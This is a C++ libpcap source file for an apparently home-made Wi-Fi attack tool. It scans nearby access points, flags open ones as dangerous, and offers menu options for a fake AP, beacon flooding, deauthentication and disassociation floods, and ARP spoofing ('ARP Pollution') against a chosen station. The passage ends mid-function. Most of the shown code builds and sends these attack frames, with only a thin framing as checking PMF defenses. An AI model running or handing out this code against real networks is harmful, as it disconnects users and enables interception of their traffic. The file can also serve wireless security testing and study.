#include <pcap.h>
#include <stdlib.h>
#include "dot11.h"
#include "radiotap.h"
#include "ethernet.h"
#include <set>
#include <string.h>
#include <vector>
#include <map>
#include <unistd.h>
#include <thread>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/if.h>
#include <iostream>


map<uint16_t,uint8_t> rd_channel={{2412,1},{2417,2},{2422,3},{2427,4},{2432,5},{2437,6},{2442,7},{2447,8},
                                   {2452,9},{2457,10},{2462,11},{2467,12},{2472,13},{5180,36},{5200,40},
                                    {5220,44},{5240,48},{5260,52},{5280,56},{5300,60},{5320,64},{5500,100},
                                   {5520,104},{5540,108},{5560,112},{5580,116},{5600,120},{5620,124},
                                  {5640,128},{5660,132},{5680,136},{5700,140},{5745,149},{5765,153},
                                  {5785,157},{5805,161},{5825,165}};


void usage(){

    printf("syntax: airodump <interface>\n");
    printf("sample: airodump wlan0\n");
}

void help_intro();
void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls);
void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls);
void select(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls,vector<uint8_t> &sel_mac,struct ap &sel_ap);
void scan_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp);
void print_station(map<vector<uint8_t>,vector<uint8_t>> arp);
void select_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip);

void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac);
void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);
void exe_arp(pcap_t* handle,vector<uint8_t> &sel_mac);
void exe_fake(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap, map<vector<uint8_t>,struct ap> ap_ls);
void exe_disasso(pcap_t* handle,vector<uint8_t> sel_mac);
void exe_reasso(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap);

void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel);
void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size);

void get_local_ip(u_char *l);
void get_local_mac(struct ifreq *v);

void find_ip(vector<uint8_t> &sel_mac,vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip);
void set_ip(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_ip);
void send_rarp(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip);

uint16_t in_cksum(uint16_t *addr, unsigned int len);

int main(int argc, char *argv[])
{

    //using namespace std;
    if(argc!=2){
        usage();
        return -1;
    }

    /* Start interface */
    /*
    system("clear");
    static const char intro[]=
            "\n\n"
            "                                  "
            " _           _     _   _ _____ _____ \n"
            "                                  "
            "| |__   ___ | |__ | \\ | | ____|_   _|\n"
            "                                  "
            "| '_ \\ / _ \\| '_ \\|  \\| |  _|   | |  \n"
            "                                  "
            "| |_) | (_) | |_) | |\\  | |___  | | \n"
            "                                  "
            "|_.__/ \\___/|_.__/|_| \\_|_____| |_| \n";
    cout << intro << endl;*/


   /* interface open */

    char* dev =argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    /* interface monitor mode on */
    char cmdbuf1[256];
    char cmdbuf2[256];
    char temp[7]{0,};

    FILE* fp;
    sprintf(cmdbuf1, "iwconfig %s| grep Mode:| awk '{print $1}' | awk -F ':' '{print $2}'", dev);
    fp = popen(cmdbuf1, "r");
    if (fp == NULL){
        perror("EROOR CODE_1\n");
        return EXIT_FAILURE;
    }
    fgets(temp, 7, fp);
    pclose(fp);

    if(strcmp(temp,"Manage") == 0){
        sprintf(cmdbuf2, "ip link set %s down && iwconfig %s mode monitor && ip link set %s up", dev, dev, dev);
        system(cmdbuf2);
    }


/*
    else if(strcmp(temp,"Monitor") == 0){
        char cmdbuf3[256];
        sprintf(cmdbuf3, "iwconfig %s mode monitor && ip link set %s up", dev, dev);
        system(cmdbuf3);}*/



    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return -1;
    }

    /* get packet */


    set<vector<uint8_t>> ap_list ;
    map<vector<uint8_t>,struct ap> ap_ls;
    vector<uint8_t> sel_mac;
    struct ap sel_ap;

    sleep(3);


    select(handle,ap_list,ap_ls,sel_mac,sel_ap);

    while(true){

        //system("clear");
        static const char intro[]=
                ""
                "                                  "
                " _           _     _   _ _____ _____ \n"
                "                                  "
                "| |__   ___ | |__ | \\ | | ____|_   _|\n"
                "                                  "
                "| '_ \\ / _ \\| '_ \\|  \\| |  _|   | |  \n"
                "                                  "
                "| |_) | (_) | |_) | |\\  | |___  | | \n"
                "                                  "
                "|_.__/ \\___/|_.__/|_| \\_|_____| |_| \n";
        cout << intro << endl;

    printf("                               ");
    printf("------------------Select------------------\n");
    printf("                                            ");
    for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
    printf("%02x\n",sel_mac[5]);
    /*
    printf("                                   ");
    for(auto k=sel_ap.essid.begin();k<sel_ap.essid.end();k++) printf("%c",(*k));
    printf("\n");*/



    int menu_nr;
    printf("                               ");
    printf("-------------------Menu-------------------\n");
    printf("                               ");
    printf("    [0] Help (Usage Introduction) \n");
    printf("                               ");
    printf("    [1] Rescan \n");
    printf("                               ");
    printf("    [2] Fake AP \n");
    printf("                               ");
    printf("    [3] ARP Pollution \n");
    printf("                               ");
    printf("    [4] Beacon Flooding \n");
    printf("                               ");
    printf("    [5] Deauth Attack & Checking \n");
    printf("                               ");
    printf("    [6] Disasso Attack & Checking \n");
    printf("                               ");
    printf("    [7] Exit \n");
    printf("                               ");
    printf("------------------------------------------\n");
    printf("select Menu Number : ");
    scanf("%d",&menu_nr);

/*
    if(menu_nr==1)select(handle,ap_list,ap_ls,sel_mac,sel_ap);
    else if(menu_nr==2)exe_fake(handle,sel_mac,sel_ap);
    else if(menu_nr==3)exe_arp(handle,sel_mac);
    else if(menu_nr==4)exe_deauth(handle,sel_mac);
    else if (menu_nr==5)exe_beacon(handle,sel_mac,sel_ap);
    else break;
    */

    switch (menu_nr) {
        case 0 : help_intro(); break;
        case 1 : select(handle,ap_list,ap_ls,sel_mac,sel_ap);break;
        case 2 : exe_fake(handle,sel_mac,sel_ap, ap_ls);break;
        case 3 : exe_arp(handle,sel_mac);break;
        case 4 : exe_beacon(handle,sel_mac,sel_ap);break;
        case 5 : exe_deauth(handle,sel_mac);break;
        case 6 : exe_disasso(handle,sel_mac);break;
        case 7 : return 0;
        default: continue;
    }

  }


}



void scan(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls){

    int cnt=0;
    time_t start=time(NULL);
       while(true){
           if(cnt==50) break;
           if(time(NULL)-start>5) break;
           struct pcap_pkthdr* header;
           const u_char* packet;
           int res = pcap_next_ex(handle,&header,&packet);
           if(res ==0) continue;
           if(res == -1 || res == -2) break;

           struct radiotap *rd = (struct radiotap *) packet;
           struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);
           if(dot11->fc.type != 0 || dot11->fc.subtype!=0x08) continue;

           uint8_t *target = dot11->bssid;



           vector<uint8_t> temp;
           vector<uint8_t> name;
           for(int i=0;i<6;i++)
               temp.push_back(*(target+i));
          cnt++;
          if(!ap_list.insert(temp).second) {ap_ls.find(temp)->second.beacon++; continue;}


          struct ssid *size_ptr= (struct ssid *)(packet+rd->len+sizeof(struct dot11_header)+sizeof(struct beacon_fixed));

          uint8_t size = size_ptr->ssid_len;

          for(int i=0;i<size;i++){

                   name.push_back(*((uint8_t *)(packet+rd->len+sizeof(dot11_header)+sizeof(struct beacon_fixed)+2+i)));
          }

          /* hj */
          uint8_t temp_type;
          int cot = 0;
          int j = 1;


          struct ap temp_ap;
          temp_ap.beacon=1;
          temp_ap.essid=name;
          temp_ap.channel=(rd_channel.find(*((uint16_t*)rd+9)))->second;
          temp_ap.pwr=-((~(*((uint8_t*)rd+22))+1)&0x000000FF);
          temp_ap.essid_len=size;
          temp_ap.cipher  = 0;

          temp_ap.enc = 0;

          while(true){
              struct ssid *size_ptr2= (struct ssid *)(packet+rd->len+sizeof(struct dot11_header)+sizeof(struct beacon_fixed)+(2*j)+size);
              // exit
              if(size_ptr2->ssid_len == 0)
                  break;

              // printf("\ntemp_type : %x\n", size_ptr2->ssid_num);
              // printf("\nlen: %x", size_ptr2->ssid_len);

              temp_type = size_ptr2->ssid_num;



              if(temp_type == 0x30){
                  struct ssid *size_ptr3= (struct ssid *)(packet+rd->len+sizeof(struct dot11_header)+sizeof(struct beacon_fixed)+(2*j)+size+7);

                  switch(size_ptr3->ssid_num){

                  case 1:
                      temp_ap.cipher = 1;
                      temp_ap.enc = 1;
                      break;
                  case 2:
                      temp_ap.cipher = 2;
                      temp_ap.enc = 2;
                      break;
                  case 4:
                      temp_ap.cipher = 4;
                      temp_ap.enc = 3;
                      break;
                  case 5:
                      temp_ap.cipher = 5;
                      temp_ap.enc = 1;
                      break;
                  default:
                      temp_ap.cipher = 0;
                      temp_ap.enc = 0;
                      break;
                  }
              }
              size = size +size_ptr2->ssid_len;
              j++;
              cot ++;

         }

          //printf("%d\n",temp_ap.pwr);
           ap_ls.insert({temp,temp_ap});




       }
}

void print_ap(set<vector<uint8_t>> ap_list,map<vector<uint8_t>,struct ap> ap_ls){
    system("clear");
    printf("\n---------------------------------------------------------------------------------------------------------------\n");
        printf("      BSSID            PWR    Beacons  #Data, #/s  CH   MB    ENC     CIPHER  AUTH ESSID  \n");
        int dcnt=0; //danger count
        int num=1;
        int cnt = 0;
        for(auto i=ap_ls.begin();i!=ap_ls.end();i++){
                 if(cnt<9)
                    printf(" [%d] ", num++);
                 else
                    printf("[%d] ", num++);
                 cnt++;

                 for(int j=0;j<5;j++)
                     printf("%02x:",i->first[j]);
                 printf("%02x",i->first[5]);



                 printf("  %3d",i->second.pwr);
                 printf("  %7d",i->second.beacon);
                 printf("              %3d",i->second.channel);
              //   cout << i->second.enc;
                 if(i->second.enc == 0){
                     printf("%13s", "OPN ");
                     dcnt++;
                 }
                 else if(i->second.enc == 1)
                     printf("%13s", "WEP ");
                 else if(i->second.enc == 2)
                     printf("%13s", "WPA ");
                 else if(i->second.enc == 3)
                     printf("%13s", "WPA2");

                 if(i->second.cipher == 1)
                     printf("%9s", "  WEP-40");
                 else if(i->second.cipher == 2)
                     printf("%9s", "  TKIP");
                 else if(i->second.cipher == 4)
                     printf("%9s", "  CCMP");
                 else if(i->second.cipher == 5)
                     printf("%9s", "  WEP-104");
                 else if(i->second.cipher == 0)
                     printf("%9s", "  - ");

                 printf("        ");
                 for(auto k=i->second.essid.begin();k<i->second.essid.end();k++)
                      printf("%c",(*k));
                 printf("\n");

            }

            if(dcnt >0){

                cnt =-1;
                num = 0;
                printf("Dangerous AP List ---------------------------------------------------------------------------------------------\n");
                printf("      BSSID            PWR    Beacons  #Data, #/s  CH   MB    ENC     CIPHER  AUTH ESSID  \n");
                for(auto i=ap_ls.begin();i!=ap_ls.end();i++){
                        cnt++;
                        num++;
                        if(i->second.enc != 0)
                            continue;
                        if(cnt<9)
                            printf(" [%d] ", num);
                         else
                            printf("[%d] ", num);


                         for(int j=0;j<5;j++)
                             printf("%02x:",i->first[j]);
                         printf("%02x",i->first[5]);



                         printf("  %3d",i->second.pwr);
                         printf("  %7d",i->second.beacon);
                         printf("              %3d",i->second.channel);

                      //   cout << i->second.enc;
                         if(i->second.enc == 0){
                             printf("%13s", "OPN ");
                         }
                         else if(i->second.enc == 1)
                             printf("%13s", "WEP ");
                         else if(i->second.enc == 2)
                             printf("%13s", "WPA ");
                         else if(i->second.enc == 3)
                             printf("%13s", "WPA2");

                         if(i->second.cipher == 1)
                             printf("%9s", "  WEP-40");
                         else if(i->second.cipher == 2)
                             printf("%9s", "  TKIP");
                         else if(i->second.cipher == 4)
                             printf("%9s", "  CCMP");
                         else if(i->second.cipher == 5)
                             printf("%9s", "  WEP-104");
                         else if(i->second.cipher == 0)
                             printf("%9s", "  - ");

                         printf("        ");
                         for(auto k=i->second.essid.begin();k<i->second.essid.end();k++)
                              printf("%c",(*k));
                         printf("\n");
                    }

            }
            printf("---------------------------------------------------------------------------------------------------------------\n");

            printf("\n");

}

void thread_scan(pcap_t* handle,bool *attack,bool *run,vector<uint8_t> sel){

    uint8_t pk_cnt=0;
    sleep(5);
    //printf("scan start\n");
    while(*run){
        //printf("scanning\n");
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap *rd = (struct radiotap *) packet;
        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);

        uint8_t *target = dot11->dest;
       bool is_continue=false;
       for(int i=0;i<6;i++){
           if(target[i]!=sel[i]) {is_continue=true;break;}}
        if(is_continue)continue;
        if((dot11->fc.type!=1) || (dot11->fc.subtype!=11)) continue;

        /*
        printf("find!!\n");

        for(int i=0;i<6;i++)
            printf("%02x",*(target+i));
        printf("\n");

        int pk_size=rd->len + sizeof(dot11->fc)+sizeof(dot11->dest)+sizeof(dot11->duration)+sizeof(dot11->sour);
        for(int i=0;i<pk_size;i++)
            printf("%02x",*(packet+i));
        printf("\n");
        */

        if(++pk_cnt>2){*attack=true;break;}
    }
}

void thread_attack(pcap_t* handle,uint8_t *packet,uint8_t packet_size){

    for(int i=0;i<500000;i++){
             if(i%100==0) {
                 if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");
                 //printf("send packet %d\n", i);
                 usleep(5000);
             }
       }
}

void exe_deauth(pcap_t* handle,vector<uint8_t> sel_mac){
    bool attack_defense=false;
    bool scan_run=true;
    uint8_t deauth_size=0;
    uint8_t *deauth=make_deauth(sel_mac,(uint8_t*)&deauth_size);
    string a;

    time_t start,end;
    printf("Deauth testing..(for 30s)\n");
    start=time(NULL);
    thread attack = thread(thread_attack,handle,deauth,deauth_size);
    thread scan = thread(thread_scan,handle,&attack_defense,&scan_run,sel_mac);

    attack.join();
    if((!attack.joinable())&&(scan.joinable())) scan_run=false;
    scan.join();
    end=time(NULL);

    if(attack_defense) a ="defensive";
    else a="not defensive";



    system("clear");

    if (a=="defensive"){
        cout << "--------------------------------------" << endl;
        cout << "The AP's PMF function is activated." << endl;
        cout << "--------------------------------------" << endl;
    }

    printf("\n\n                               ");
    printf("------------------Result------------------\n");
    printf("                                         ");
    printf("Total time : %f\n",(double)end-start);
    printf("                                      ");
    printf("Deauth defense : %s\n",a.c_str());
    printf("                               ");
    printf("------------------------------------------\n");


}
void exe_beacon(pcap_t* handle,vector<uint8_t> sel_mac,struct ap sel_ap){
    uint8_t beacon1_size;
    uint8_t *beacon1=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,1);
    uint8_t *beacon2=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,2);
    uint8_t *beacon3=make_beacon(sel_mac,sel_ap,(uint8_t*)&beacon1_size,3);



    for(int i=0;i<10000;i++){
     if (pcap_sendpacket(handle, beacon1, beacon1_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, beacon2, beacon1_size) != 0) printf("\nsend packet Error \n");
     if (pcap_sendpacket(handle, beacon3, beacon1_size) != 0) printf("\nsend packet Error \n");
     if(i%1000==0) printf("~Beacon Flooding~\n");
     usleep(5000);
    }
}

void select(pcap_t* handle,set<vector<uint8_t>> &ap_list,map<vector<uint8_t>,struct ap> &ap_ls,vector<uint8_t> &sel_mac,struct ap &sel_ap){

    int sel;
    while(true){
        ap_list.clear();
        ap_ls.clear();
        scan(handle,ap_list, ap_ls);


        /* Print AP list*/

        print_ap(ap_list,ap_ls);


        /* Select AP */


        printf("select AP Number (research:0) : ");
        scanf("%d",&sel);

        if(sel==0) continue;
        else break;
    }


    int number=1;
    for(auto i=ap_ls.begin();i!=ap_ls.end();i++){
        if(sel!=number++) continue;

        sel_mac=i->first;
        sel_ap=i->second;


       }
}

void scan_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp){

    int cnt=0;
    //printf("scanning..");
    time_t start=time(NULL);
    while(true){
        if(cnt==3) break;
        if(time(NULL)-start>5) break;
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle,&header,&packet);
        if(res ==0) continue;
        if(res == -1 || res == -2) break;

        struct radiotap *rd = (struct radiotap *) packet;
        struct dot11_header *dot11 = (struct dot11_header *)(packet+rd->len);

        uint8_t *dest_target = dot11->dest;
        //uint8_t *sour_target = dot11->sour;
        bool is_continue1=false;
        //bool is_continue2=false;
        for(int i=0;i<6;i++){
           if(dest_target[i]!=sel_mac[i]) {is_continue1=true;break;}}

        /*
        for(int i=0;i<6;i++){
           if(sour_target[i]!=sel_mac[i]) {is_continue2=true;break;}}*/
        if(is_continue1)continue;

        /* destinataion addr == select AP MAC*/



        if(dot11->fc.type==0) continue;



        if((dot11->fc.type==1)&&(dot11->fc.subtype!=8)) continue;
        if((dot11->fc.type==1)&&(dot11->fc.subtype!=10)) continue;
        if((dot11->fc.type==1)&&(dot11->fc.subtype!=11)) continue;


        cnt++;




        /* only control(only rts,bar,ps poll) */

        vector<uint8_t> temp_mac;
        vector<uint8_t> temp_ip;




        for(int i=0;i<4;i++) temp_ip.push_back(0x11);

        for(int i=0;i<6;i++) temp_mac.push_back(dot11->sour[i]);


        arp.insert({temp_mac,temp_ip});


    }




}

void print_station(map<vector<uint8_t>,vector<uint8_t>> arp){


    printf("      BSSID                       IP\n");

    int num=1;
    for(auto i=arp.begin();i!=arp.end();i++)
           {
             if(num>9)printf("[%d]",num++);
             else printf("[%d] ",num++);

             for(int j=0;j<5;j++)
                 printf("%02x:",i->first[j]);
             printf("%02x",i->first[5]);
             printf("          ");
             for(int j=0;j<3;j++)
                 printf("%d.",i->second[j]);
             printf("%d",i->second[3]);

             printf("\n");

           }
        printf("total station : %ld\n",arp.size());

}

void select_station(pcap_t* handle,vector<uint8_t> &sel_mac,map<vector<uint8_t>,vector<uint8_t>> &arp,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip){

    int sel;
    while(true){
        //arp.clear();
        scan_station(handle,sel_mac,arp);
        //system("clear");



        /* Print station list*/
        print_station(arp);


        /* Select station */


        printf("select station Number (research:0) : ");
        scanf("%d",&sel);

        if(sel==0) continue;
        else break;
    }


    int number=1;
    for(auto i=arp.begin();i!=arp.end();i++){
        if(sel!=number++) continue;

        sel_st_mac=i->first;
        sel_st_ip=i->second;


       }
}

void exe_arp(pcap_t* handle,vector<uint8_t> &sel_mac){

    map<vector<uint8_t>,vector<uint8_t>> arp;
    vector<uint8_t> sel_st_mac;
    vector<uint8_t> sel_st_ip;
    vector<uint8_t> sel_ip; //ap's ip
    for(int i=0;i<4;i++) sel_ip.push_back(0x11);

    select_station(handle,sel_mac,arp,sel_st_mac,sel_st_ip);
    while(true){

        printf("                               ");
        printf("--------------------AP--------------------\n");
        printf("                                            ");
        for(int j=0;j<5;j++) printf("%02x:",sel_mac[j]);
        printf("%02x\n",sel_mac[5]);
        printf("                                               ");
        for(int j=0;j<3;j++) printf("%d.",sel_ip[j]);
        printf("%d\n",sel_ip[3]);


        printf("                               ");
        printf("------------------Station-----------------\n");
        printf("                                            ");
        for(int j=0;j<5;j++) printf("%02x:",sel_st_mac[j]);
        printf("%02x\n",sel_st_mac[5]);
        printf("                                               ");
        for(int j=0;j<3;j++) printf("%d.",sel_st_ip[j]);
        printf("%d\n",sel_st_ip[3]);
        int menu_nr;
        printf("                               ");
        printf("-------------------Menu-------------------\n");
        printf("                               ");
        printf("    [1] Rescan \n");
        printf("                               ");
        printf("    [2] ARP Pollution \n");
        printf("                               ");
        printf("    [3] Find IP \n");
        printf("                               ");
        printf("    [4] Set IP \n");
        printf("                               ");
        printf("    [5] Exit \n");
        printf("                               ");
        printf("------------------------------------------\n");
        printf("select Menu Number : ");
        scanf("%d",&menu_nr);

        /*
        if(menu_nr==1)select_station(handle,sel_mac,arp,sel_st_mac,sel_st_ip);
        else if(menu_nr==2)send_rarp(sel_ip,sel_st_mac,sel_st_ip);
        else if(menu_nr==3) find_ip(sel_mac,sel_ip,sel_st_mac,sel_st_ip);
        else if(menu_nr==4) set_ip(sel_ip,sel_st_ip);
        else break;*/

        switch (menu_nr) {

            case 1 : select_station(handle,sel_mac,arp,sel_st_mac,sel_st_ip);break;
            case 2 : send_rarp(sel_ip,sel_st_mac,sel_st_ip);break;
            case 3 : find_ip(sel_mac,sel_ip,sel_st_mac,sel_st_ip);break;
            case 4 : set_ip(sel_ip,sel_st_ip);break;
            case 5 : return;
            default: continue;
        }

    }


}

void set_ip(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_ip){
    string ap_ip;
    printf("AP IP(xx.xx.xx.xx): ");
    cin.ignore();
    getline(cin,ap_ip,'\n');

    string st_ip;




    size_t previous = 0,current;
    current = ap_ip.find('.');
    int i=0;

    while (true)
    {

        string substring = ap_ip.substr(previous, current - previous);

        sel_ip[i++]=stoi(substring);
        if(current == string::npos) {break;}//cout << substring;
        //cout << substring << ".";
        previous = current + 1;

        current = ap_ip.find('.',previous);
    }


    printf("Station IP(xx.xx.xx.xx): ");
    getline(cin,st_ip,'\n');
    previous = 0;
    current = st_ip.find('.');
    i=0;
    printf("\n");

    while (true)
    {

        string substring = st_ip.substr(previous, current - previous);


        sel_st_ip[i++]=stoi(substring);

        if(current == string::npos) {break;}//cout << substring;
        //cout << substring << ".";
        previous = current + 1;

        current = st_ip.find('.',previous);
    }
    cout<<"\n";


}

void find_ip(vector<uint8_t> &sel_mac,vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip){

    char dev[5] ={'e','t','h','0','\0'};
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return;
    }

    /*get local mac*/
    struct ifreq s;
    get_local_mac(&s);


    /*get local ip*/

    u_char local[4];
    get_local_ip(local);

    /*set ARP packet*/

    struct libnet_ethernet_hdr ehdr;
    struct arp_hdr ahdr;

    for(int i=0;i<6;i++) ehdr.ether_dhost[i]=0xff;
    for(int i=0;i<6;i++) ehdr.ether_shost[i]=s.ifr_addr.sa_data[i];//local mac

    ehdr.ether_type=htons(ARP);
    ahdr.htype=htons(ETH);
    ahdr.ptype=htons(IPv4);
    ahdr.hlen=HLEN;
    ahdr.plen=PLEN;
    ahdr.opcode=htons(REQ);

    for(int i=0;i<6;i++){
        ahdr.h_src[i]=s.ifr_addr.sa_data[i];
        printf("%02x ",ahdr.h_src[i]);
            }//local mac

    for(int i=0;i<4;i++){
        ahdr.ip_src[i]=local[i];
        printf("%d. ",ahdr.ip_src[i]);
          }//local ip
    for(int i=0;i<6;i++){
        ahdr.h_dst[i]=sel_st_mac[i];
        printf("%02x ",ahdr.h_dst[i]);
                }//mac=>zero

    int ip=1;
    bool find_station_ip=false;
    bool find_ap_ip=false;
    while(ip<255){
        printf("\ndestination IP : ");
    for(int i=0;i<3;i++){
        ahdr.ip_dst[i]=local[i];
        printf("%d. ",ahdr.ip_dst[i]);}
        ahdr.ip_dst[3]=ip++;printf("%d",ahdr.ip_dst[3]);
        printf("\n");

        /*send ARP REQ*/

        uint8_t packet_size = sizeof(struct libnet_ethernet_hdr)+sizeof(struct arp_hdr);

        uint8_t *packet;


        packet = (uint8_t *)malloc(sizeof(uint8_t) * packet_size);
        memcpy(packet, &ehdr, sizeof(struct libnet_ethernet_hdr));
        memcpy(packet + sizeof(struct libnet_ethernet_hdr), &ahdr, sizeof(struct arp_hdr));


        for(int i=0;i<5;i++)
        {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");usleep(5000);}

        printf("\nSend ARP REQ Packet\n");

        struct libnet_ethernet_hdr *newhdr;
        struct arp_hdr* arp_reply;

        time_t start,end;
        start=time(NULL);

        while(true) {
            end=time(NULL);
            if(end-start>0) {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");}
            if(end-start>1) {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");}
            if(end-start>2) {if (pcap_sendpacket(handle, packet, packet_size) != 0) printf("\nsend packet Error \n");}


            struct pcap_pkthdr* header;
            const u_char* pack;
            int res = pcap_next_ex(handle, &header, &pack);
            if (res == 0) continue;
            if (res == -1 || res == -2) break;


            newhdr = (struct libnet_ethernet_hdr *)pack;
            if(end-start>5) {printf("skip\n");break;}


            if(ntohs(newhdr->ether_type)!=ARP) continue;
            arp_reply = (struct arp_hdr *)(pack + sizeof(struct libnet_ethernet_hdr));

            if(ntohs(arp_reply->opcode)!=REP) continue;




            int cnt=0;
            for(int i=0;i<4;i++){if(ahdr.ip_dst[i]==arp_reply->ip_src[i])cnt++;}
            if(cnt==4) {printf("\nReceive ARP REP Packet\n");break;}
            }
        for(int i=0;i<6;i++)printf("%02x.",arp_reply->h_src[i]);
        printf("\n");

      int cnt1=0;
      int cnt2=0;

      for(int i=0;i<6;i++){if(ahdr.h_dst[i]==arp_reply->h_src[i])cnt1++;}
      for(int i=0;i<6;i++){if(sel_mac[i]==arp_reply->h_src[i])cnt2++;}
      printf("\n");
      if(cnt1==6) {
          printf("find station IP\n");
          for(int i=0;i<4;i++){
            sel_st_ip[i]=arp_reply->ip_dst[i];
            printf("%d. ",sel_st_ip[i]);}
          find_station_ip=true;}
     printf("\n");

      if(cnt2==6) {
          printf("find AP IP\n");
          for(int i=0;i<4;i++){
            sel_ip[i]=arp_reply->ip_dst[i];
            printf("%d. ",sel_ip[i]);}
          find_ap_ip=true;}
      printf("\n");

      if(find_station_ip) break;
       }


    }



void send_rarp(vector<uint8_t> &sel_ip,vector<uint8_t> &sel_st_mac,vector<uint8_t> &sel_st_ip){

    int cnt=0;
    for(int i=0;i<4;i++){if(sel_st_ip[i]==0x11)cnt++;}
    if(cnt==4) {printf("you should find IP first\n");return;}

    char dev[5] ={'e','t','h','0','\0'};
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if(handle==NULL){
        fprintf(stderr,"couldn't open device %s: %s\n",dev,errbuf);
        return;
    }

    /*get local mac*/
    struct ifreq s;
    get_local_mac(&s);
    uint8_t local_mac[6];


    /*get local ip*/

    u_char local[4];
    get_local_ip(local);


    /*make reply packet*/


    struct libnet_ethernet_hdr r_ehdr;
    struct arp_hdr r_ahdr;


    for(int i=0;i<6;i++)
        r_ehdr.ether_shost[i]=s.ifr_addr.sa_data[i];
    for(int i=0;i<6;i++){
        r_ehdr.ether_dhost[i]=0xff;
    }//local mac
    r_ehdr.ether_type=htons(ARP);

    r_ahdr.htype=htons(ETH);
    r_ahdr.ptype=htons(IPv4);
    r_ahdr.hlen=HLEN;
    r_ahdr.plen=PLEN;
    r_ahdr.opcode=htons(REP);

    printf("\nARP - SOURCE MAC ");
    for(int i=0;i<6;i++){
        local_mac[i]=s.ifr_addr.sa_data[i];
        r_ahdr.h_src[i]=local_mac[i];
        printf("%02x ",r_ahdr.h_src[i]);
    }//Local mac

    printf("\nARP - SOURCE IP ");
    for(int i=0;i<4;i++){
        r_ahdr.ip_src[i]=sel_ip[i];
        printf("%d. ",r_ahdr.ip_src[i]);
    }//AP ip

    printf("\nARP - DST MAC ");
    for(int i=0;i<6;i++){
        r_ahdr.h_dst[i]=sel_st_mac[i];
        printf("%02x ",r_ahdr.h_dst[i]);
    }//station mac

    printf("\nARP - DST IP ");
    for(int i=0;i<4;i++){
        r_ahdr.ip_dst[i]=sel_st_ip[i];
        printf("%d. ",r_ahdr.ip_dst[i]);
    }//station IP */

    /*send reply packet*/


   //printf("\nSend ARP Reply Packet\n");

   u_char* arp_rep_packet;
   int packet_size = sizeof(struct libnet_ethernet_hdr)+sizeof(struct arp_hdr);

   arp_rep_packet = (u_char *)malloc(sizeof(u_char) * packet_size);
   memcpy(arp_rep_packet, &r_ehdr, sizeof(struct libnet_ethernet_hdr));
   memcpy(arp_rep_packet + sizeof(struct libnet_ethernet_hdr), &r_ahdr, sizeof(struct arp_hdr));



   for(int i=0;i<5;i++)
    {if (pcap_sendpacket(handle, arp_rep_packet, packet_size) != 0) printf("\nsend packet Error \n");usleep(5000);}
   printf("\n>>Send ARP Reply<<\n");

   /*make ping request*/

   struct libnet_ethernet_hdr p_ehdr;
   struct ipv4_hdr p_ip_hdr;
   struct icmp_hdr p_icmp_hdr;

   for(int i=0;i<6;i++){

       p_ehdr.ether_shost[i]=local_mac[i];
    }
   for(int i=0;i<6;i++){
       p_ehdr.ether_dhost[i]=sel_st_mac[i];
   }
   p_ehdr.ether_type=htons(IPv4);

   p_ip_hdr.version=4;
   p_ip_hdr.hdr_len=5;
   p_ip_hdr.tos=0;
   p_ip_hdr.ident=0x7878;
   p_ip_hdr.fragment=htons(0x4000);
   p_ip_hdr.ttl=64;
   p_ip_hdr.proto_type=1;
   p_ip_hdr.hdr_checksum=0;
   for(int i=0;i<4;i++)
    p_ip_hdr.ip_src[i]=sel_ip[i];
   for(int i=0;i<4;i++)
    p_ip_hdr.ip_dst[i]=sel_st_ip[i];


   p_icmp_hdr.type=8;
   p_icmp_hdr.code=0;
   p_icmp_hdr.identif=0x7878;
